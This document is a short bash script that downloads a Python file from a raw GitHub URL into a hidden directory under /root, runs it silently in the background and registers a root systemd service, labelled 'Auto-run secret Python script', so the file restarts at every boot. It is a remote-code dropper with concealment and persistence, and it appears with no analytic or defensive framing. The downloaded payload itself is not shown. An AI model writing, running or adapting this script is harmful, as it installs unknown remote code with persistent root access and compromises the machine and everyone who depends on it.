#!/bin/bash

URL="https://raw.githubusercontent.com/t56r4re/34553/refs/heads/main/gd.py"
DIR="/root/.system_service"
FILE="$DIR/gd.py"
SRV="/etc/systemd/system/python_auto.service"

mkdir -p "$DIR" && chmod 700 "$DIR"
curl -fsS -o "$FILE" "$URL" || { echo "Download failed"; exit 1; }
chmod 700 "$FILE"
nohup python3 "$FILE" >/dev/null 2>&1 &

if [ ! -f "$SRV" ]; then
  cat > "$SRV" <<EOF
[Unit]
Description=Auto-run secret Python script
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 $FILE
Restart=always
User=root

[Install]
WantedBy=multi-user.target
EOF

  systemctl daemon-reload
  systemctl enable "$(< <(basename "$SRV"))" >/dev/null 2>&1 || systemctl enable python_auto.service
fi

echo "Done."
